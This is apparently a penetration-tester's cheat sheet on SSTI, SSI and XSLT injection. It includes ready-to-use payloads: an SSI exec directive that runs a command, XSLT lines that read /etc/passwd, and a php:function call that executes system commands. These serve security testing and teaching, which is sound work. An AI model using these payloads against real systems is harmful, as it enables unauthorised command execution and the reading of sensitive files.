
## SSTI (Server-Side Template Injection)

### Exploitation

* Templating Engines are used to dynamically generate content

### Test String

Find a reflected entry point and test:

```
${{<%[%'"}}%\.
```

---

## SSI Injection (Server-Side Includes)

Typical file extensions: `.shtml`, `.shtm`, and `.stm`

### Directives

#### Print Variables

```html
<!--#printenv -->
```

#### Print Specific Variable

```html
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

#### Execute Command

```html
<!--#exec cmd="whoami" -->
```

#### Include Web File

```html
<!--#include virtual="index.html" -->
```

---

## XSLT Injection

- Look for parameters where user input is reflected in XML-like output.
- Look for inputs like template=, xsl=, transform=, style=, xslt=, etc.
- Observe if the output structure resembles XML transformations or data shaping.

### Common XSLT Elements

* `<xsl:template>` — Defines a template and uses the `match` attribute to apply it to XML paths.
* `<xsl:value-of>` — Extracts the value of the XML node specified in the `select` attribute.
* `<xsl:for-each>` — Loops over all XML nodes specified in the `select` attribute.
* `<xsl:sort>` — Sorts elements in a loop using `select` and `order` attributes.
* `<xsl:if>` — Conditional execution using the `test` attribute.

### Injection Payloads

#### Information Disclosure

```xml
<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
<xsl:value-of select="system-property('xsl:product-name')" />
<xsl:value-of select="system-property('xsl:product-version')" />
```

#### LFI (Local File Inclusion)

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

#### RCE (Remote Code Execution) / Info Disclosure

```xml
<xsl:value-of select="php:function('system','id')" />
```
